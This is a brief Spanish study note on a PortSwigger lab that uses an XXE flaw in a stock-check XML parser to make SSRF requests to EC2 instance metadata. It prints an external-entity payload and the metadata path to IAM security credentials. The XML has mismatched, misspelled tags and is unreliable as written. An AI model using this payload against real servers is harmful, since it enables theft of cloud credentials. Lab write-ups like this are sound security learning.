# XXE para realizar ataques SSRF 

Tags: #XXE #PortSwigger #XML 

```bash
En este lab se continua explorando el potencial de las vulnerabilidades XXE, pero esta vez orientadas a realizar ataques de tipo SSRF (Server-Side Request Forgery). Aprovechamos el parser XML de la funcionalidad de comprobación de stock para que, en lugar de acceder a archivos locales, se conecte a un endpoint interno del servidor: la metadata de una instancia EC2 simulada en http://169.254.169.254/.

- EC2 'Amazon Elastic Compute Cloud': Es nuna parte central de la plataforma de cómputo en la nube de la empresa Amazon denominada Amazon Web Services y permite a los usuarios alquilar computadoras virtuales en las cuales pueden ejecutar sus propias aplicaciones
```

```xml
<!-- Petición modificada colocando una entidad externa general -->

<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://web.com/">]>     
	<stockCehck>
		<productId>
			&xxe;
		</productId>
		<storedID>
			1
		</storedId>
	</stockCheck>


Notas:
	1. Colocar una URL para que enliste el recurso que existe, algunas veces funciona como 'directory listing' para llegar a ver mas directorios y contenido en la 'red interna'
	2. Ruta completa = 'latest/meta-data/iam/security-credentials/admin'
```
